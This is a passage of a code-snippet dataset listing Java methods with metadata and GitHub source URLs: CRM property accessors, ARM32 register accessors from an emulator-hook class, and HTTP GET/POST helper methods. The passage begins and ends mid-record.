"https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/TransactionProperties.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59404, "method_name": "getReference", "class_name": "TransactionProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getReference()\n    {\n    \treturn reference;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/TransactionProperties.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59405, "method_name": "setReference", "class_name": "TransactionProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setReference( String reference )\n    {\n    \tthis.reference = reference;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/TransactionProperties.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59406, "method_name": "serializeToData", "class_name": "TransactionProperties", "params": ["StringBuilder", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void serializeToData( StringBuilder data, String prefix )\n    {\n        Utils.addSetupPair( data, prefix, \"enable\", Utils.booleanToStringInt( enable ) );\n        data.append( \"#\\n\" );            \n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/TransactionProperties.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59407, "method_name": "getFieldOrder", "class_name": "ProcBsdShortInfo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "    protected List<String> getFieldOrder() {\n        return Arrays.asList(\"pbsi_pid\", \"pbsi_ppid\", \"pbsi_pgid\", \"pbsi_status\", \"pbsi_comm\", \"pbsi_flags\",\n                \"pbsi_uid\", \"pbsi_gid\", \"pbsi_ruid\", \"pbsi_rgid\", \"pbsi_svuid\", \"pbsi_svgid\", \"pbsi_rfu\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/kernel/ProcBsdShortInfo.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": ["DarwinSyscall"], "modifiers": ["public"]}}, {"id": 59408, "method_name": "setR0", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR0(int r0) {\n        registerContext.setR0(r0);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59409, "method_name": "setR1", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR1(int r1) {\n        registerContext.setR1(r1);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59410, "method_name": "setR2", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR2(int r2) {\n        registerContext.setR2(r2);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59411, "method_name": "setR3", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR3(int r3) {\n        registerContext.setR3(r3);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59412, "method_name": "setR4", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR4(int r4) {\n        registerContext.setR4(r4);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59413, "method_name": "setR5", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR5(int r5) {\n        registerContext.setR5(r5);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59414, "method_name": "setR6", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR6(int r6) {\n        registerContext.setR6(r6);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59415, "method_name": "setR7", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setR7(int r7) {\n        registerContext.setR7(r7);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59416, "method_name": "setStackPointer", "class_name": "Arm32HookContext", "params": ["Pointer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStackPointer(Pointer sp) {\n        registerContext.setStackPointer(sp);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59417, "method_name": "getR0Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR0Long() {\n        return registerContext.getR0Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59418, "method_name": "getR1Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR1Long() {\n        return registerContext.getR1Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59419, "method_name": "getR2Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR2Long() {\n        return registerContext.getR2Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59420, "method_name": "getR3Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR3Long() {\n        return registerContext.getR3Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59421, "method_name": "getR4Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR4Long() {\n        return registerContext.getR4Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59422, "method_name": "getR5Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR5Long() {\n        return registerContext.getR5Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59423, "method_name": "getR6Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR6Long() {\n        return registerContext.getR6Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59424, "method_name": "getR7Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR7Long() {\n        return registerContext.getR7Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59425, "method_name": "getR8Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR8Long() {\n        return registerContext.getR8Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59426, "method_name": "getR9Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR9Long() {\n        return registerContext.getR9Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59427, "method_name": "getR10Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR10Long() {\n        return registerContext.getR10Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59428, "method_name": "getR11Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR11Long() {\n        return registerContext.getR11Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59429, "method_name": "getR12Long", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getR12Long() {\n        return registerContext.getR12Long();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59430, "method_name": "getR0Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR0Int() {\n        return registerContext.getR0Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59431, "method_name": "getR1Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR1Int() {\n        return registerContext.getR1Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59432, "method_name": "getR2Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR2Int() {\n        return registerContext.getR2Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59433, "method_name": "getR3Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR3Int() {\n        return registerContext.getR3Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59434, "method_name": "getR4Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR4Int() {\n        return registerContext.getR4Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59435, "method_name": "getR5Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR5Int() {\n        return registerContext.getR5Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59436, "method_name": "getR6Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR6Int() {\n        return registerContext.getR6Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59437, "method_name": "getR7Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR7Int() {\n        return registerContext.getR7Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59438, "method_name": "getR8Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR8Int() {\n        return registerContext.getR8Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59439, "method_name": "getR9Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR9Int() {\n        return registerContext.getR9Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59440, "method_name": "getR10Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR10Int() {\n        return registerContext.getR10Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59441, "method_name": "getR11Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR11Int() {\n        return registerContext.getR11Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59442, "method_name": "getR12Int", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getR12Int() {\n        return registerContext.getR12Int();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59443, "method_name": "getR0Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR0Pointer() {\n        return registerContext.getR0Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59444, "method_name": "getR1Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR1Pointer() {\n        return registerContext.getR1Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59445, "method_name": "getR2Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR2Pointer() {\n        return registerContext.getR2Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59446, "method_name": "getR3Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR3Pointer() {\n        return registerContext.getR3Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59447, "method_name": "getR4Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR4Pointer() {\n        return registerContext.getR4Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59448, "method_name": "getR5Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR5Pointer() {\n        return registerContext.getR5Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59449, "method_name": "getR6Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR6Pointer() {\n        return registerContext.getR6Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59450, "method_name": "getR7Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR7Pointer() {\n        return registerContext.getR7Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59451, "method_name": "getR8Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR8Pointer() {\n        return registerContext.getR8Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59452, "method_name": "getR9Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR9Pointer() {\n        return registerContext.getR9Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59453, "method_name": "getR10Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR10Pointer() {\n        return registerContext.getR10Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59454, "method_name": "getR11Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR11Pointer() {\n        return registerContext.getR11Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59455, "method_name": "getR12Pointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getR12Pointer() {\n        return registerContext.getR12Pointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59456, "method_name": "getIntArg", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getIntArg(int index) {\n        return registerContext.getIntArg(index);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59457, "method_name": "getLongArg", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getLongArg(int index) {\n        return registerContext.getLongArg(index);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59458, "method_name": "getPointerArg", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getPointerArg(int index) {\n        return registerContext.getPointerArg(index);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59459, "method_name": "getLR", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getLR() {\n        return registerContext.getLR();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59460, "method_name": "getLRPointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getLRPointer() {\n        return registerContext.getLRPointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59461, "method_name": "getPCPointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getPCPointer() {\n        return registerContext.getPCPointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59462, "method_name": "getStackPointer", "class_name": "Arm32HookContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer getStackPointer() {\n        return registerContext.getStackPointer();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59463, "method_name": "getInt", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getInt(int regId) {\n        return registerContext.getInt(regId);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59464, "method_name": "getLong", "class_name": "Arm32HookContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getLong(int regId) {\n        return registerContext.getLong(regId);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/hook/Arm32HookContext.java", "stars": "16", "class_props": {"extends": "HookContext", "implements": ["EditableArm32RegisterContext"], "modifiers": []}}, {"id": 59465, "method_name": "doGet", "class_name": "HttpClient", "params": ["String", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String doGet(String url, Map<String, String> paraMap) {\n    CloseableHttpClient client = null;\n    CloseableHttpResponse response = null;\n    String result = null;\n    try {\n      client = HttpClients.createDefault();\n      URIBuilder uriBuilder = new URIBuilder(url);\n      uriBuilder.setParameters(convert(paraMap));\n      HttpGet httpGet = new HttpGet(uriBuilder.build());\n      httpGet.setConfig(getDefaultRequestConfig());\n      response = client.execute(httpGet);\n      if (HttpStatus.SC_OK == response.getStatusLine().getStatusCode()) {\n        HttpEntity entity = response.getEntity();\n        result = EntityUtils.toString(entity, UTF_8);\n      }\n    } catch (Exception e) {\n      LOG.error(e.getMessage());\n      e.printStackTrace();\n    } finally {\n      if (Objects.nonNull(response)) {\n        try {\n          response.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n      if (Objects.nonNull(client)) {\n        try {\n          client.close();\n        } catch (IOException e) {\n          e.printStackTrace();\n        }\n      }\n    }\n    return result;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/http/HttpClient.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59466, "method_name": "doPost", "class_name": "HttpClient", "params": ["String", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String doPost(String url, Map<String, String> paraMap) {\n    CloseableHttpClient client = HttpClients.createDefault();;\n    CloseableHttpResponse response = null;\n    String result = null;\n    try {\n      paraMap.put(\"api_version\",\"java-1.0.0\");\n      HttpPost httpPost = new HttpPost(url);\n      httpPost.setConfig(getDefaultRequestConfig());\n      httpPost.setEntity(new UrlEncodedFormEntity(convert(paraMap), 